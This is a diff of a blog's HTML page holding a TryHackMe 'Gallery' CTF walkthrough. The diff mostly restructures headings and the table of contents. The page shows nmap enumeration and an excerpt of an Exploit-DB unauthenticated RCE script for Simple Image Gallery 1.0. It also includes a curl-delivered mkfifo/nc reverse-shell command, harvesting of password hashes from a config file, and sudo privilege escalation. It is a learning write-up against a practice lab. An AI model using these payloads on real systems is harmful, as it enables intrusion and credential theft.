@@ -214,11 +214,11 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
     
 </div>
 
-  <h1 id="introduction">Introduction</h1>
+  <h2 id="introduction">Introduction</h2>
 <p><strong>Challenge Name</strong>: <a href="https://tryhackme.com/room/gallery666">Gallery</a></p>
 <p><strong>Difficulty</strong>: Easy</p>
 <p><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c53a8eb73f24535345477fdf603fe1de.png" alt="Gallery"></p>
-<h1 id="nmap-enumeration">Nmap Enumeration</h1>
+<h2 id="nmap-enumeration">Nmap Enumeration</h2>
 <p><strong>Command :</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -A -T4 --open -p- 10.10.17.83 -oN Gallery.nmap 
 </span></span></code></pre></div><p><strong>Output :</strong></p>
@@ -270,7 +270,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <p>Q: <strong>What&rsquo;s the name of the CMS?</strong></p>
 <p>A: <strong>Simple Image Gallery</strong></p>
 </blockquote>
-<h1 id="fetching-the-exploit">Fetching the Exploit</h1>
+<h2 id="fetching-the-exploit">Fetching the Exploit</h2>
 <p><strong>Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)</strong> -&gt; <a href="https://www.exploit-db.com/exploits/50214">Exploit</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 17.08.2021</span>
@@ -345,8 +345,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;- NO :( -&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;No bypass user&#34;</span>)
-</span></span></code></pre></div><h1 id="user-flag">User Flag</h1>
-<h2 id="run-the-exploit">Run the exploit</h2>
+</span></span></code></pre></div><h2 id="user-flag">User Flag</h2>
+<h3 id="run-the-exploit">Run the exploit</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py
 </span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> http://10.10.17.83/gallery/
 </span></span><span style="display:flex;"><span>Login Bypass
@@ -362,9 +362,9 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>shell uploading
 </span></span><span style="display:flex;"><span>- OK -
 </span></span><span style="display:flex;"><span>Shell URL : http://10.10.17.83/gallery/uploads/1663192260_TagoacenqkeozzskpfxLetta.php?cmd<span style="color:#f92672">=</span>whoami
-</span></span></code></pre></div><h2 id="get-a-reverse-shell">Get A Reverse Shell</h2>
+</span></span></code></pre></div><h3 id="get-a-reverse-shell">Get A Reverse Shell</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#39;http://10.10.17.83/gallery/uploads/1663192260_TagoacenqkeozzskpfxLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20&lt;THM IP&gt;%20&lt;PORT&gt;%20%3E%2Ftmp%2Ff&#39;</span>
-</span></span></code></pre></div><h2 id="get-admin-hash">Get Admin Hash</h2>
+</span></span></code></pre></div><h3 id="get-admin-hash">Get Admin Hash</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat initialize.php                                                                                          
 </span></span><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>$dev_data <span style="color:#f92672">=</span> array<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;-1&#39;</span>,<span style="color:#e6db74">&#39;firstname&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;Developer&#39;</span>,<span style="color:#e6db74">&#39;lastname&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;dev_oretnom&#39;</span>,<span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;5da283a2d990e8d8512cf967df5bc0d0&#39;</span>,<span style="color:#e6db74">&#39;last_login&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;date_updated&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#e6db74">&#39;date_added&#39;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>;
@@ -422,7 +422,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <p>Q: <strong>What&rsquo;s the hash password of the admin user?</strong></p>
 <p>A: <strong>a228b12a08b6527e7978cbe5d914531c</strong></p>
 </blockquote>
-<h2 id="get-user-flag">Get User Flag</h2>
+<h3 id="get-user-flag">Get User Flag</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cd /var/backups/mike_home_backup
 </span></span><span style="display:flex;"><span>$ ls -la
 </span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
@@ -453,8 +453,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>Password: 
 </span></span><span style="display:flex;"><span>mike@gallery:~$ cat user.txt 
 </span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>xxxx-xxx-xxx-xxxx<span style="color:#f92672">}</span>
-</span></span></code></pre></div><h1 id="escalating-to-root">Escalating to Root</h1>
-<h2 id="sudo-privileges">Sudo Privileges</h2>
+</span></span></code></pre></div><h2 id="escalating-to-root">Escalating to Root</h2>
+<h3 id="checking-sudo-privileges">Checking Sudo Privileges</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
 </span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> mike on gallery:
 </span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
@@ -479,7 +479,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>    *<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>        exit;;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">esac</span>
-</span></span></code></pre></div><p><strong>Privilege Escalation Steps :</strong></p>
+</span></span></code></pre></div><h3 id="get-root-flag">Get Root Flag</h3>
 <ul>
 <li>Run <code>sudo /bin/bash /opt/rootkit.sh</code></li>
 <li>Type in <code>read</code></li>
@@ -511,14 +511,23 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
     <h4></h4>
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#run-the-exploit">Run the exploit</a></li>
-    <li><a href="#get-a-reverse-shell">Get A Reverse Shell</a></li>
-    <li><a href="#get-admin-hash">Get Admin Hash</a></li>
-    <li><a href="#get-user-flag">Get User Flag</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#sudo-privileges">Sudo Privileges</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#nmap-enumeration">Nmap Enumeration</a></li>
+    <li><a href="#fetching-the-exploit">Fetching the Exploit</a></li>
+    <li><a href="#user-flag">User Flag</a>
+      <ul>
+        <li><a href="#run-the-exploit">Run the exploit</a></li>
+        <li><a href="#get-a-reverse-shell">Get A Reverse Shell</a></li>
+        <li><a href="#get-admin-hash">Get Admin Hash</a></li>
+        <li><a href="#get-user-flag">Get User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#escalating-to-root">Escalating to Root</a>
+      <ul>
+        <li><a href="#checking-sudo-privileges">Checking Sudo Privileges</a></li>
+        <li><a href="#get-root-flag">Get Root Flag</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
 </div>
